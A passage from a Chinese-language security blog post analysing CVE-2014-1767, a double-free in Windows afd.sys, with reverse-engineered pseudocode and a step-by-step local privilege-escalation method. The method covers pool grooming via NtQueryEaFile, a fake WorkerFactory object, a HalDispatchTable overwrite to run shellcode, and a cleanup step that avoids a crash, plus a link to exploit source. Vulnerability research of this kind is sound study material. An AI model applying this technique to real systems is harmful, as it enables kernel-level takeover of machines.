<h6><span style="color: #000000;font-family: courier new,courier">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{</span></h6>
<h6><span style="color: #000000;font-family: courier new,courier">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MmUnlockPages(pMdl) ;</span></h6>
<h6><span style="color: #000000;font-family: courier new,courier">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span></h6>
<h6><span style="font-family: courier new,courier"><span style="color: #000000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color: #993300">// </span></span><span style="color: #993300">请注意此处！释放了mdl资源，但是tpElement+0x0C的指针没有清空！！！</span></span></h6>
<h6><span style="color: #000000;font-family: courier new,courier">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color: #993300">// dangling Pointer here !</span></span></h6>
<h6><span style="color: #000000;font-family: courier new,courier">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IoFreeMdl(pMdl) ; </span></h6>
<h6><span style="color: #000000;font-family: courier new,courier">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span></h6>
<h6><span style="color: #000000;font-family: courier new,courier">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span></h6>
<h6><span style="color: #000000;font-family: courier new,courier">&nbsp;&nbsp;&nbsp;&nbsp;}</span></h6>
<h6><span style="color: #000000;font-family: courier new,courier">}</span></h6>
<h6><span style="color: #000000;font-family: courier new,courier">if(*(BYTE*)(tpInfo+0×32) != 0)</span></h6>
<h6><span style="color: #000000;font-family: courier new,courier">{</span></h6>
<h6><span style="font-family: courier new,courier"><span style="color: #000000">&nbsp;&nbsp;&nbsp;&nbsp;ExFreePoolWithTag(*(DWORD*)(tpInfp+0×20), </span><span style="color: #000000">0C</span><span style="color: #000000">6646641h) ;</span></span></h6>
<h6><span style="color: #000000;font-family: courier new,courier">&nbsp;&nbsp;&nbsp;*(BYTE*)(tpInfo+0×32) = 0 ;</span></h6>
<h6><span style="color: #000000;font-family: courier new,courier">}</span></h6>
<h6><span style="font-family: courier new,courier"><span style="color: #000000">if(arg2) // </span><span style="color: #000000">我们的调用中</span><span style="color: #000000"> arg2 = 1</span></span></h6>
<h6><span style="color: #000000;font-family: courier new,courier">{</span></h6>
<h6><span style="font-family: courier new,courier"><span style="color: #000000">&nbsp; </span><span style="color: #000000">// </span><span style="color: #000000">将</span><span style="color: #000000">tpInfo</span><span style="color: #000000">返回到</span><span style="color: #000000"> look aside </span></span></h6>
<h6><span style="color: #000000;font-family: courier new,courier">&nbsp;&nbsp;ExFreeToNPagedLookasideList(AfdGlobalData+0×178, tpInfo) ; }&nbsp;&nbsp; </span></h6>
<h6><span style="color: #000000;font-family: courier new,courier">else</span></h6>
<h6><span style="color: #000000;font-family: courier new,courier">{</span></h6>
<h6><span style="color: #000000;font-family: courier new,courier">&nbsp;&nbsp;&nbsp;AfdFreeTpInfo(tpInfo) ; // ExFreePoolWithTag</span></h6>
<h6><span style="color: #000000;font-family: courier new,courier">}</span></h6>
<h5>===========================<br>
<span style="font-family: verdana,geneva"> &nbsp;</span><br>
<span style="font-family: verdana,geneva"> 针对我们这次执行流，AfdReturnTpInfo 执行的效果就是 free 掉了 刚刚申请的MDL资源，并且将tpInfo指针push到lookaside list 中去了！</span><span style="font-family: verdana,geneva">Double free的第一次free，dangling pointer 也就开始于此时！</span><br>
<span style="font-family: verdana,geneva"> free掉mdl后，<strong>存放在tpInfo中的Mdl指针并没有清空，tpInfo中elemCount也维持原始值</strong>，未做改动，<strong>那么假设现在再调用一次 AfdReturnTpInfo ，则势必会造成double free ！</strong></span></h5>
<h5><span style="font-family: verdana,geneva">怎么样再次调用一次 AfdReturnTpInfo 呢 ？</span><br>
<span style="font-family: verdana,geneva"> 考虑到afd.sys中 AfdReturnTpInfo 是在 大多是在异常处理程序 中使用的，因此考虑 再制造一次 异常 ！ 当然要想命中 double free 必须保证 在发生异常时候， tpInfo 中的值不能被破坏 ！ 我们继续看看Poc是怎么做到的。</span></h5>
<p>&nbsp;</p>
<h5><strong><span style="font-family: verdana,geneva;font-size: medium">C.第二次DeviceIoControl调用分析( 0x120C3)</span></strong></h5>
<h5><strong><span style="font-family: verdana,geneva">a. AfdTransmitPackets分析：</span></strong><br>
<span style="font-family: verdana,geneva"> 第二次 DeviceIoControl，IoControlCode = 0x120C3, 内部调用</span><br>
<span style="font-family: verdana,geneva"> AfdTransmitPackets:</span><br>
<span style="font-family: courier new,courier">====================================</span></h5>
<h6><span style="font-family: courier new,courier"><span style="color: #000000">&nbsp;</span><span style="color: #000000">__fastcall AfdTransmitPackets(PIRP Irp, PIO_STACK_LOCATION IoStack)</span></span></h6>
<h6><span style="color: #000000;font-family: courier new,courier">{</span></h6>
<h6><span style="color: #000000;font-family: courier new,courier">&nbsp;&nbsp;&nbsp;&nbsp;IoStack-&gt;InputBufferLength &gt;= 0×10</span></h6>
<h6><span style="color: #000000;font-family: courier new,courier">&nbsp;&nbsp;&nbsp;&nbsp;IoStack-&gt;Type3InputBuffer &amp; 3 == 0</span></h6>
<h6><span style="color: #000000;font-family: courier new,courier">&nbsp;&nbsp;&nbsp;&nbsp;IoStack-&gt;Type3InputBuffer &lt; 0x7fff0000</span></h6>
<h6><span style="color: #000000;font-family: courier new,courier">&nbsp;&nbsp;&nbsp;&nbsp;memcpy(tempBuf, IoStack-&gt;Type3InputBuffer, 0×10); </span></h6>
<h6><span style="font-family: courier new,courier"><span style="color: #000000">&nbsp;&nbsp;&nbsp;&nbsp;*(DWORD*)(tempBuf+0x</span><span style="color: #000000">0C</span><span style="color: #000000">) &amp; 0xFFFFFFF8 == 0</span></span></h6>
<h6><span style="font-family: courier new,courier"><span style="color: #000000">&nbsp;&nbsp;&nbsp;&nbsp;*(DWORD*)(tempBuf+0x</span><span style="color: #000000">0C</span><span style="color: #000000">) &amp; 0×30 != 0×30</span></span></h6>
<h6><span style="color: #000000;font-family: courier new,courier">&nbsp;&nbsp;&nbsp;&nbsp;*(DWORD*)(tempBuf) != 0</span></h6>
<h6><span style="color: #000000;font-family: courier new,courier">&nbsp;&nbsp;&nbsp;&nbsp;*(DWORD*)(tempBuf+4) != 0</span></h6>
<h6><span style="color: #000000;font-family: courier new,courier">&nbsp;&nbsp;&nbsp;&nbsp;*(DWORD*)(tempBuf+4) &lt;= 0x0AAAAAAA</span></h6>
<h6><span style="color: #000000;font-family: courier new,courier">&nbsp;</span></h6>
<h6><span style="color: #993300;font-family: courier new,courier">&nbsp;&nbsp;&nbsp;&nbsp;// 以上条件关系全部成立则控制流达到此处，</span></h6>
<h6><span style="color: #993300;font-family: courier new,courier">&nbsp;&nbsp;&nbsp;&nbsp;// 用户输入 可以控制 申请的TpElement数目 ！！！</span></h6>
<h6><span style="color: #000000;font-family: courier new,courier">&nbsp;&nbsp;&nbsp;&nbsp;AfdTliGetTpInfo( *(DWORD*)(tempBuf+4) )</span></h6>
<h6><span style="color: #000000;font-family: courier new,courier">}</span></h6>
<h6><span style="font-family: courier new,courier">=====================================</span></h6>
<h5><span style="font-family: verdana,geneva">我们在inbuf2中设置 *(inbuf2) ==1 , *(inbuf2+4) == 0x0AAAAAAA ,恰好可以满足控制流，至此我们可以要求 AfdTliGetTpInfo 申请 0x0AAAAAAA 个TpElement ！</span><br>
<span style="font-family: verdana,geneva"> 回头查看 AfdTliGetTpInfo 函数，此时我们会先从 lookaside list 中取出一个 tpInfo ，由于第一次刚放进去一个 ！那么此时我们从lookaside list中得到的就是那个 TpInfo 结构 ！ 注意 此结构的某个元素pMdl是dangling pointer ！</span></h5>
<h5><span style="font-family: verdana,geneva">AfdTliGetTpInfo继续执行会进入到if判断，此时if条件成立 ！ (0x0AAAAAAA &gt; 3) ，</span><br>
<strong><span style="font-family: verdana,geneva"> 然后是会尝试申请&nbsp; 0×18 * 0x0AAAAAAA = 0xfffffff0 字节内存 ！</span></strong><br>
<strong><span style="font-family: verdana,geneva"> 显然在我们的32位系统上这么大的内存申请会失败 ！ 于是此时我们就成功再依次进入了 一个异常处理程序 ！</span></strong><br>
<strong><span style="font-family: verdana,geneva"> 异常处理程序同样调用了 AfdReturnTpInfo&nbsp; ! ，至此就像我们前面所说的，TpInfo中的danling pointer再一次被IoFreeMdl 尝试 free ！ double free 的 BUG 发生了 ！</span></strong></h5>
<p>&nbsp;</p>
<h5><strong><span style="font-family: verdana,geneva;font-size: medium">D. 漏洞原理总结：</span></strong></h5>
<h5><span style="font-family: verdana,geneva">[1] 第一次DeviceIoControl， IoControlCode = 0x1207F, afd.sys内部调用 AfdTransmitFile，AfdTransmitFile首先会调用AfdTliGetTpInfo获得一个TpInfo结构体。然后依照我们输入buffer中提供的virtualAddres和length去申请一个MDL，</span><br>
<span style="font-family: verdana,geneva"> 申请MDL后，将MDL的地址填入到TpInfo的数组域内。调用MmProbeAndLockPages尝试锁定这块内存，由于我们提供的是无效的地址范围，此时抛出异常，异</span><span style="font-family: verdana,geneva">常处理程序调用AfdReturnToInfo释放刚刚申请的TpInfo到lookaside list。同时释放掉刚刚申请的MDL问题是被释放的TpInfo的域的值没有被清空，elemCount和pMdl都没有清理，pMdl此时就是dangling pointer</span></h5>
<p>&nbsp;</p>
<h5><span style="font-family: verdana,geneva">[2] 第二次DeviceIoControl, IoControlCode =0x120c3, afd.sys内部调用 AfdTransmitPackets，AfdTransmitPackets内部调用AfdTliGetTpInfo获得一个TpInfo结构体,而调用 AfdTliGetTpInfo 时的参数 是由我们的输入指定的！</span><br>
<span style="font-family: verdana,geneva"> AfdTliGetTpInfo首先从lookaside list中拿出一个TpInfo指针，这个指针正是第一次IoControl时候申请的那个！，然后因为我们指定的参数elemCount大于3，AfdTliGetTpInfo尝试Alloc额外的内存，因为我们可以恶意指定很大的内存申请，这导致了申请内存过程中发生异常，程序执行流再次进入异常处理，异常处理程序调用 AfdReturnToInfo 尝试释放刚刚申请的TpInfo，因为此时TpInfo中完全保留的是第一次IoControl时填充的“过时”的值，因此造成pMdl dangling pointer的二次释放，导致double-free crash !</span></h5>
<h5><span style="font-family: verdana,geneva">&nbsp;</span></h5>
<h5><span style="font-family: verdana,geneva">&nbsp;</span></h5>
<h5><span style="font-family: verdana,geneva">&nbsp;</span></h5>
<h5><strong><span style="font-family: verdana,geneva;font-size: large">[0x02]. double-free漏洞利用:</span></strong></h5>
<h5><span style="font-size: medium"><strong><span style="font-family: verdana,geneva">a. 思路</span></strong></span></h5>
<h5><span style="font-family: verdana,geneva"> 这一段思路总体上参考了那篇PDF中提到的思路:</span><br>
<span style="font-family: verdana,geneva"> [1].&nbsp; 调用DeviceIoControl， IoControlCode = 0x1207F, 造成一次MDL&nbsp; free</span><br>
<span style="font-family: verdana,geneva"> [2].&nbsp; 创建某个对象，使得这个对象恰好占据刚才被free掉的空间，至此转化double-free为use-after-free问题</span><br>
<span style="font-family: verdana,geneva"> [3].&nbsp; 调用DeviceIoControl, IoControlCode =0x120c3，走入重复释放流程，释放掉刚才新申请的对象！</span><br>
<span style="font-family: verdana,geneva"> [4].&nbsp; 覆盖被释放掉的对象为可控数据（伪造对象）</span><br>
<span style="font-family: verdana,geneva"> [5].&nbsp; 尝试调用能够操作此对象的函数，让函数通过操作我们刚刚覆盖的可控数据，实现一&nbsp; 个内核内存写操作，这个写操作最理想的就是“任意地址写任意内容”，这样我们就可以覆写HalDispatchTable的某个单元为我们ShellCode的地址，这样就可以劫持一个内核函数调用</span><br>
<span style="font-family: verdana,geneva"> [6]. 用户层触发刚刚被Hook的HalDispatchTable函数，使得内核执行shellcode，提权</span></h5>
<p>&nbsp;</p>
<h5><span style="font-size: medium"><strong><span style="font-family: verdana,geneva">b. 找合适的UAF对象</span></strong></span><br>
<span style="font-family: verdana,geneva"> 这个思路下来，我们就是要把double free转化为use-after-free来用，关键的关键是 我们选择用什么样的对象来uaf？这个对象至关重要。我们对他主要由几个要求：</span><br>
<span style="font-family: verdana,geneva"> A).&nbsp; 这个对象的大小要等于第一次被释放的内存的大小。</span><br>
<span style="font-family: verdana,geneva"> B).&nbsp; 这个对象应该有这样一个操作函数，这个函数能够操作我们的恶意数据，使得我们间接实现任意地址写任意内容</span></h5>
<h5><span style="font-family: verdana,geneva">我们查看得知，第一次释放的是一个MDL对象，MDL对象的大小是由virtualAddress和length共同决定的!（这一点可以通过逆向IoAllocateMdl确认）但是恰好,我们这里的virtualAddress和length是我们可以用户层控制、指定的！因此A)的要求就不必担心了，因为我们可以控制释放空间的大小。具体的：</span><br>
<span style="font-family: verdana,geneva"> pages = ((Length &amp; 0xFFF)&nbsp; + (VirtualAddress &amp; 0xFFF) + 0xFFF)&gt;&gt;12&nbsp; +&nbsp; (length&gt;&gt;12)</span><br>
<span style="font-family: verdana,geneva"> freedSize = mdlSize = pages*sizeof(PVOID) + 0x1C</span></h5>
<h5><span style="font-family: verdana,geneva">那么对b限制，怎么样能找到这么完美的对象呢？它的函数会有这么美妙的间接操作~~，</span><br>
<span style="font-family: verdana,geneva"> 外文PDF提到了WorkerFactory了。我们去看一下它的几个函数。</span><br>
<span style="font-family: verdana,geneva"> NtCreateWorkerFactory创建一个WorkerFactory对象。</span></h5>
<h5><span style="font-family: verdana,geneva">关键在于函数：NtSetInformationWorkerFactory</span><br>
<span style="font-family: verdana,geneva"> &nbsp;<a href="http://www.secniu.com/cve-2014-1767-afd-sys-double-free-vulnerability-analysis-and-exploit/attachment/8/" rel="attachment wp-att-237"><img class="alignnone size-full wp-image-237" src="./CVE-2014-1767 Afd.sys double-free vulnerability Analysis and Exploit - Binary Vuln Analysis - Vulnerability Analysis - SecNiu_files/8.jpg" alt="" width="833" height="258"></a></span></h5>
<h5><span style="font-family: verdana,geneva">我们逆向看一下它的内部，发现了一个十分完美的复制语句，这就是为什么作者为我们介绍这个对象的原因吧：）</span><br>
<span style="font-family: verdana,geneva"> 当参数满足一定条件（arg2 == 8 &amp;&amp; *arg3 !=0)时，我们可以达到一个任意地址写任意内容的目的：</span><br>
<span style="color: #ff6600;font-family: verdana,geneva"> *(*(*object+0×10)+0x1C) == *arg3</span><br>
<span style="font-family: verdana,geneva"> 我们可以设置 :</span><br>
<span style="font-family: verdana,geneva"> *arg3 = ShellCode ,&nbsp; *(*object+0×10)+0x1C == HalDispatchTable某个单元 ，</span><br>
<span style="font-family: verdana,geneva"> 这是完全可行的，因为我们如果可以成功覆盖object的话，object的内容是我们可控的！</span></h5>
<p>&nbsp;</p>
<h5><span style="font-size: medium"><strong><span style="font-family: verdana,geneva">c. 怎么copy构造的数据覆盖内核内存？</span></strong></span><br>
<span style="font-family: verdana,geneva"> &nbsp; 到这里我们还有一个问题，就是怎么实现第四步说的覆盖被释放掉的对象为可控数据，只有实现了这一步我们才能利用上面的 *(*(*object+0×10)+0x1C) == *arg3 实现任意地址写任意内容。</span><br>
<span style="font-family: verdana,geneva"> 我们分析知道被释放的MDL属于NonPagedPool，而用户空间的VirtualAlloc并没有能力为我们在NonPagedPool上分配空间从而让我们覆盖我们的数据！这就又要采取类似使用NtSetInformationWorkerFactory的方法，找那样一个Nt*系列函数，它的内部操作能够为我们完成一次ExAllocatePool并且是NonPagedPool，并且还有能复制我们的数据到它新申请的这个内存中去！说白了就是完成一次内核Alloc并且memcpy的操作！会有这么完美的函数等着我们嘛？会是哪个？还是借助那篇pdf的思路，对就是NtQueryEaFile&nbsp; !(发现这样一个函数估计要把Nt*逆个遍了）</span><br>
<span style="font-family: verdana,geneva"> 我们看看它的内部：</span><br>
<span style="font-family: verdana,geneva"> &nbsp;<a href="http://www.secniu.com/cve-2014-1767-afd-sys-double-free-vulnerability-analysis-and-exploit/attachment/9/" rel="attachment wp-att-238"><img class="alignnone size-full wp-image-238" src="./CVE-2014-1767 Afd.sys double-free vulnerability Analysis and Exploit - Binary Vuln Analysis - Vulnerability Analysis - SecNiu_files/9.jpg" alt="" width="696" height="145"></a></span></h5>
<h5><a href="http://www.secniu.com/cve-2014-1767-afd-sys-double-free-vulnerability-analysis-and-exploit/attachment/10/" rel="attachment wp-att-239"><img class="alignnone size-full wp-image-239" src="./CVE-2014-1767 Afd.sys double-free vulnerability Analysis and Exploit - Binary Vuln Analysis - Vulnerability Analysis - SecNiu_files/10.jpg" alt="" width="895" height="178"></a><br>
<span style="font-family: verdana,geneva">&nbsp;&nbsp;</span></h5>
<h5><span style="font-family: verdana,geneva">就是说内部会调用 </span><br>
<span style="font-family: verdana,geneva"> p = ExAllocatePoolWithQuotaTag(NonPagedPool,&nbsp; EaLength, 0x20206F49)</span><br>
<span style="font-family: verdana,geneva"> memcpy(p, EaList)</span><br>
<span style="font-family: verdana,geneva"> 其中EaLength与EaList都是输入参数，用户可控。</span><br>
<span style="font-family: verdana,geneva"> 很完美!&nbsp; 只是有一个坑需要注意！，这里使用的是 ExAllocatePoolWithQuotaTag 而不是 ExAllocatePoolWithTag，因此实际上是不同的！差别在于申请的内存字节数上，对于 ExAllocatePoolWithQuotaTag ，其内部是调用的</span><br>
<span style="font-family: verdana,geneva"> ExAllocatePoolWithTag(PoolType, length+4, tag)，</span><br>
<span style="color: #ff6600;font-family: verdana,geneva"> 因此使用NtQueryEaFile时候，字节数=EaLength=objSize-0×4才可以正常占位。</span><br>
<span style="font-family: verdana,geneva"> 另外NtQueryEaFile函数其实结束时还是会释放掉刚刚申请的空间的，但是这个过程中只有开头的几个字节会被破坏，其余内容还是保留着的，因此不影响利用。</span></h5>
<p>&nbsp;</p>
<h5><span style="font-size: medium"><strong><span style="font-family: verdana,geneva">d. WorkerFactory对象占据的空间大小是多少？</span></strong></span></h5>
<h5><span style="font-family: verdana,geneva">确定这个值我们才能进行一系列的释放与占用。</span><br>
<span style="font-family: verdana,geneva"> 这个可以跟踪:</span><br>
<span style="font-family: verdana,geneva"> NtCreateWorkerFactory-&gt;ObpCreateObject-&gt;ObpAllocateObject-&gt;</span><span style="font-family: verdana,geneva">ExAllocatePoolWithTag</span><br>
<span style="font-family: verdana,geneva"> 我们发现 ExAllocatePoolWithTag 申请的字节数是 0xA0 字节 ！，但是返回到NtCreateWorkerFactory时候，对象指针是 p+0×28 ，p是ExAllocatePoolWithTag返回的指针。这也是可以解释的，因为每个对象都有一个Header，这个可以从dt _OBJECT_HEADER看出来，body跟header偏移0×18字节，另外ObpAllocateObject也附加了一层信息0×10字节因此总共就是偏移原始内存+0×28字节。知道这个我们才可以布局我们的fake object，实现内核写。</span><br>
<span style="font-family: verdana,geneva"> nt!_OBJECT_HEADER</span><br>
<span style="font-family: verdana,geneva"> &nbsp;&nbsp; +0×000 PointerCount&nbsp;&nbsp;&nbsp;&nbsp; : 0n1</span><br>
<span style="font-family: verdana,geneva"> &nbsp;&nbsp; +0×004 HandleCount&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : 0n0</span><br>
<span style="font-family: verdana,geneva"> &nbsp;&nbsp;&nbsp; . . . .&nbsp;&nbsp;&nbsp; . . .&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; . . .</span><br>
<span style="font-family: verdana,geneva"> &nbsp;&nbsp; +0×014 SecurityDescriptor : (null) </span><br>
<span style="font-family: verdana,geneva"> &nbsp;&nbsp; +0×018 Body&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : _QUAD</span></h5>
<h5><span style="font-family: verdana,geneva">另外，在ObjHeader中有许多域的值很重要，我们需要提前设置，因为NtSetInformationWorkerFactory中调用ObReferenceObjectByHandle,</span><span style="font-family: verdana,geneva">通过句柄获得对象地址，这里要校验objHeader里面的内容才可以成功获得Obj地址（这里就是p+0×28处）。具体填充哪些内容？</span><span style="font-family: verdana,geneva">可以分析object创建过程或者结合WRK看一下，我的方法是直接复制一个已申请的obj的前面0×28字节保存到数组，测试中发现没有异常。</span><br>
<span style="font-family: verdana,geneva"> HalDispatchTable劫持我们依然选择 HalDispatchTable+sizeof(PVOID)的位置劫持，用户层使用NtQueryIntervalProfile触发。</span></h5>
<p>&nbsp;</p>
<h5><span style="font-size: medium"><strong><span style="font-family: verdana,geneva">e. exp设计，成功提权</span></strong></span></h5>
<h5><span style="font-family: verdana,geneva"> 梳理一下流程就是：</span><br>
<span style="font-family: verdana,geneva"> [1] 第一次IoControl，释放MDL，我们通过virtualAddress和length设置此时被释放的MDL内存大小为0xA0</span><br>
<span style="font-family: verdana,geneva"> [2] NtCreateWorkerFactory申请新的WorkerFactoy对象，占据【1】中被释放掉的内存</span><br>
<span style="font-family: verdana,geneva"> [3] 第二次IoControl，通过double free 释放掉刚刚申请的 WorkerFactoy对象</span><br>
<span style="font-family: verdana,geneva"> [4] NtQueryEaFile 使用我们精心设置的内容填充刚被释放掉的WorkerFactory对象内存空间(UAF)</span><br>
<span style="font-family: verdana,geneva"> [5] NtSetInformationWorkerFactory操作我们的fake object，达到修改HalDispatchTable+4内容为ShellCode</span><br>
<span style="font-family: verdana,geneva"> [6] 用户层调用NtQueryIntervalProfile，触发内核执行shellcode</span></h5>
<p>&nbsp;</p>
<h5><span style="font-size: medium"><strong><span style="font-family: verdana,geneva">f. 拒绝蓝屏 —&gt; hack HandleTableEntry</span></strong></span></h5>
<h6><span style="font-family: verdana,geneva"> 最后我想说的是，经过上面流程提权完全ok了，但是有个挥之不去的问题 - </span><br>
<span style="font-family: verdana,geneva"> 蓝屏 (BSOD)</span><br>
<span style="font-family: verdana,geneva"> 为什么会蓝屏？</span><br>
<span style="font-family: verdana,geneva"> 实际操作发现，当结束提权程序时候，会直接crash蓝屏，想想也是，我们已经破坏了WorkerFactory对象，但是系统并不知道，在进程退出时要清理对象，于是蓝屏也可以理解。</span><br>
<span style="font-family: courier new,courier"> 93da9b74 83e8d3d8 00000000 bad0b124 00000000 nt!MmAccessFault+0×106</span><br>
<span style="font-family: courier new,courier"> 93da9b74 8409210f 00000000 bad0b124 00000000 nt!KiTrap0E+0xdc</span><br>
<span style="font-family: courier new,courier"> 93da9c38 840c0ba9 890d33b0 95e7c288 853f4030 nt!<span style="color: #ff6600">ObpCloseHandleTableEntry</span>+0×28</span><br>
<span style="font-family: courier new,courier"> 93da9c68 840a8f86 890d33b0 93da9c7c 890012c8 nt!<span style="color: #ff6600">ExSweepHandleTable</span>+0x5f</span><br>
<span style="font-family: courier new,courier"> 93da9c88 840b6666 bee06ad8 00000000 853f36a0 nt!<span style="color: #ff6600">ObKillProcess</span>+0×54</span><br>
<span style="font-family: courier new,courier"> 93da9cfc 840a8bb9 00000000 ffffffff 002dfa38 nt!PspExitThread+0x5db</span><br>
<span style="font-family: courier new,courier"> 93da9d24 83e8a1ea ffffffff 00000000 002dfa44 nt!NtTerminateProcess+0x1fa</span></h6>
<h5><span style="font-family: verdana,geneva">因为蓝屏发生在提权之后，因此我们完全可以在内核态shellcode实现hack，让系统不知道这个已经corrupt的对象!通过逆向ExSweepHandleTable发现了解决方法。ExSweepHandleTable大意：(ObjectTable来自EPROCESS)</span></h5>
<h5>&nbsp;======================</h5>
<h6><span style="font-family: verdana,geneva">Handle = 4<br>
while(ObjectTable-&gt;HandleCount)<br>
{<br>
HandleTableEntry = ExpLookupHandleTableEntry(ObjectTable, Handle) ;<br>
if(*((DWORD*)(HandleTableEntry) &amp; 1)<br>
{<br>
ObpCloseHandleTableEntry(…) ;<br>
}<br>
Handle += 4<br>
}</span></h6>
<h5><span style="font-family: verdana,geneva">======================</span></h5>
<h5><span style="font-family: verdana,geneva">我们要做的就是 将hWorkerFactory 对应的HandleTableEntry的Object域置为NULL ！，这样就越过了本句柄的释放步骤！</span><br>
<span style="font-family: verdana,geneva"> 逆向ExpLookupHandleTableEntry得出Handle与HandleTableEntry的关系：</span><br>
<span style="color: #ff6600;font-family: verdana,geneva"> HandleTableEntry = *(DWORD*)ObjectTable + 2*(Handle &amp; 0xFFFFFFC0)</span><br>
<span style="font-family: verdana,geneva"> 因此通过将对应的HandleTableEntry的Object域清为NULL就可以了，此外HandleCount也要记得减1.</span><br>
<span style="font-family: verdana,geneva"> 另外，恢复HalDispatchTable的项也是必要的，否则有可能因为被其他进程调用而蓝屏。</span></h5>
<p>&nbsp;</p>
<h5><strong><span style="font-family: verdana,geneva;font-size: large">[0x03] 最后</span></strong><br>
<strong><span style="font-family: verdana,geneva"> a. 对于win 7 X64</span></strong><br>
<span style="font-family: verdana,geneva"> win7 x64应该有两个区别，一是各个结构偏移，二是要使用 CreateRoundRectRgn 消耗内核内存，以便能够顺利进入第二次异常</span><br>
<strong><span style="font-family: verdana,geneva"> b. 对于 Win8</span></strong><br>
<span style="font-family: verdana,geneva"> 参考PDF资料吧，lz没精力搞了=-=</span><br>
<strong><span style="font-family: verdana,geneva"> c. tr34sur3</span></strong><br>
<span style="font-family: verdana,geneva"> double-free利用</span><br>
<span style="font-family: verdana,geneva"> WorkerFactory</span><br>
<span style="font-family: verdana,geneva"> NtQueryEaFile</span><br>
<span style="font-family: verdana,geneva"> 都是好东西 </span></h5>
<h5></h5>
<p>ps: 附件是win7 32bit Exp源码可参考</p>
<h5><span style="font-family: verdana,geneva"><span style="font-family: helvetica"><strong>0x710DDDD</strong></span> (Vsbat)</span></h5>
<h5><span style="font-family: verdana,geneva"> 2014-11-14</span></h5>
<p><a href="http://www.secniu.com/cve-2014-1767-afd-sys-double-free-vulnerability-analysis-and-exploit/afd_1767_exp/" rel="attachment wp-att-240">afd_1767_Exp</a></p>
<p>&nbsp;</p>
  </div>
    <div class="panel-footer">
	<div class="text-muted">
  本文由 <span itemprop="author">0x710DDDD</span> 在 <time itemprop="datePublished" datetime="2014-11-15T16:20:10+00:00">2014/11/15</time> 发布在 <span itemprop="articleSection"><a href="http://www.secniu.com/category/vulnerability-analysis/binary-vuln-analysis/" title="View all posts in Binary Vuln Analysis" rel="category tag">Binary Vuln Analysis</a>，<a href="http://www.secniu.com/category/vulnerability-analysis/" title="View all posts in Vulnerability Analysis" rel="category tag">Vulnerability Analysis</a></span> 贴了标签 <span itemprop="keywords"><a href="http://www.secniu.com/tag/cve-2014-1767/" rel="tag">CVE-2014-1767</a>，<a href="http://www.secniu.com/tag/exploit/" rel="tag">Exploit</a>，<a href="http://www.secniu.com/tag/privilge-escalation/" rel="tag">Privilge Escalation</a></span>   共有 5820 次浏览 如果发现内容有误请告知我们，我们将及时更正，SecNiu因有你而美好。 <a href="http://www.secniu.com/cve-2014-1767-afd-sys-double-free-vulnerability-analysis-and-exploit/#comments"><span class="text-danger"><abbr title="内容报错"><span class="glyphicon glyphicon-info-sign"></span> 报错</abbr></span></a>
	</div>
  </div>
</div>
<ul class="pager">
  <li class="previous"><a href="http://www.secniu.com/maybe-cve-2012-1889-exploit-analysis/" rel="prev"><span>«</span> CVE-2012-1889 exploit sample analysis </a></li>  <li class="next"><a href="http://www.secniu.com/englishversioncve-2014-1767-afd-sys-double-free-vulnerability-analysis-and-exploit/" rel="next">[EnglishVersion]CVE-2014-1767 Afd.sys double-free vulnerability Analysis and Exploit <span>»</span></a></li></ul>
<div id="comments"><div id="comments" class="panel panel-default">

		<div class="panel-heading">
		<h4>咦？还没有评论，抢沙发！</h4>
		</div>
				<div class="panel-body">

<ol>
</ol>
				
								<div id="respond">
				<h3 id="reply-title">发表评论 <small><a rel="nofollow" id="cancel-comment-reply-link" href="http://www.secniu.com/cve-2014-1767-afd-sys-double-free-vulnerability-analysis-and-exploit/#respond" style="display:none;">取消评论</a></small></h3>
									<form action="http://www.secniu.com/wp-comments-post.php" method="post" id="commentform">
																			<div class="col-xs-12 mt20 mb20"><span class="help-block">带 * 的是必填项目，电子邮件地址不会被公开。</span></div>							<div class="col-lg-4 col-md-4 col-sm-4"><label for="author">名称</label> <span class="text-danger"><span class="glyphicon glyphicon-asterisk"></span></span><input class="form-control" placeholder="请输入你的名称" id="author" name="author" type="text" value="" size="30"></div>
<div class="col-lg-4 col-md-4 col-sm-4"><label for="email">邮箱</label> <span class="text-danger"><span class="glyphicon glyphicon-asterisk"></span></span><input class="form-control" placeholder="请输入你的邮箱" id="email" name="email" type="text" value="" size="30"></div>
<div class="col-lg-4 col-md-4 col-sm-4"><label for="url">网址</label><input class="form-control" placeholder="请输入你的网址" id="url" name="url" type="text" value="" size="30"></div>
												<div class="clean"></div><div class="col-xs-12 mt20"><textarea class="form-control" rows="3" placeholder="说点什么吧..." id="comment" name="comment" cols="45" aria-required="true"></textarea></div>						<div class="col-xs-12 mt20 mb20"><span class="help-block">文字的交流也是情感的交流，技能的交流也是学术的交流。</span></div>						<p class="form-submit">
							<input name="submit" type="submit" id="submit" value="发表评论">
							<input type="hidden" name="comment_post_ID" value="231" id="comment_post_ID">
<input type="hidden" name="comment_parent" id="comment_parent" value="0">
						</p>
						Are you human? Click the Pineapple...<div style="margin:20px 0;">
